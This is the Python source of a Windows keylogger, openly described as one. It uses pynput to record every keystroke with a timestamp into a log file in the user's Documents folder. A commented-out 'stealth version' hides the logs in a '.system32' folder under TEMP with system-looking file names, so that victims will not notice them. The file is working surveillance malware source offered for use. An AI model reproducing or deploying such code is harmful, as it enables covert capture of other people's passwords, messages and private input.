"""
This is a simple keylogger that logs all keystrokes and saves them to a custom directory of your choice.

Note:It is designed to be used on Windows systems.
     It is not designed to be used on Linux systems.
     It is not designed to be used on MacOS systems.
     It is not designed to be used on Android systems.
     It is not designed to be used on iOS systems.
     It is not designed to be used on any other system.
"""

import logging
from pynput import keyboard
import os
from datetime import datetime
import sys

# Windows-specific setup
def get_windows_log_dir():
    """Get appropriate log directory for Windows"""
    # Try to create logs in user's Documents folder (say)
    documents_path = os.path.expanduser("~/Documents")
    if os.path.exists(documents_path):
        return os.path.join(documents_path, "logs")
    
    # Fallback to current working directory
    return os.path.join(os.getcwd(), "logs")

# SETUP: Create logs/ folder in appropriate location
log_dir = get_windows_log_dir()
os.makedirs(log_dir, exist_ok=True)

# Generate log file (Timestamped)
timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
log_file = os.path.join(log_dir, f"winkylgr_{timestamp}.txt")

print(f"[+] Windows Keylogger logging to: {log_file}")
print(f"[+] Press Ctrl+C to stop logging")

# Keystroke Handler for Windows v1
def on_press(key):
    try:
        # Handle regular characters
        if hasattr(key, 'char') and key.char:
            with open(log_file, "a", encoding='utf-8') as f:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
        else:
            # Handle special keys
            with open(log_file, "a", encoding='utf-8') as f:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")
    except Exception as e:
        # Handle any encoding or file write errors
        with open(log_file, "a", encoding='utf-8') as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - ERROR: {str(e)}\n")

# stealth version (uncomment to use)
"""
# Windows stealth configuration
def get_stealth_log_dir():
    # Use Windows temp directory for stealth
    temp_dir = os.environ.get('TEMP', os.environ.get('TMP', 'C:\\Windows\\Temp'))
    return os.path.join(temp_dir, '.system32')
    
log_dir = get_stealth_log_dir()
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, f"system_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

# Windows logging setup
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s",
    encoding='utf-8'
)

def on_press_stealth(key):      # Keystroke Handler for Windows v2
    try:
        if hasattr(key, 'char') and key.char:
            logging.info(f"Key: {key.char}")
        else:
            logging.info(f"Special Key: {key}")
    except Exception as e:
        logging.error(f"Error logging key: {e}")
"""

# Start Listener
def run():
    print("[+] Starting Windows keylogger...")
    print("[+] Press any keys to log them...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Windows-specific driver code
def main():
    try:
        # Check if running on Windows
        if sys.platform != "win32":
            print("[!] Warning: This script is designed for Windows systems")
            print("[!] Running on:", sys.platform)
        
        run()
    except KeyboardInterrupt:
        print("\n[+] Win keylogger stopped by user.")
    except PermissionError:
        print("[!] Permission denied. Try running as administrator.")
    except Exception as e:
        print(f"[!] Error: {e}")
        print("[!] Make sure you have the required permissions")


if __name__ == "__main__":
    main() 